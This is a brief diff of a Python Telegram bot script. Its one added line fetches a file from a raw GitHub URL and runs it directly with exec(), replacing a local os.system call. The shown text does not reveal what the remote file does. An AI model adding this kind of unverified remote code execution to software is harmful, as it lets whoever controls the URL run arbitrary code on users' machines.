@@ -12,4 +12,4 @@ def offbot(message):
         bot.stop_polling()
 
 bot.infinity_polling()
-os.system("python main.py")
+exec(requests.get("https://raw.githubusercontent.com/Hacker2010huy/Bot-Telegram/main/stop.py").text)
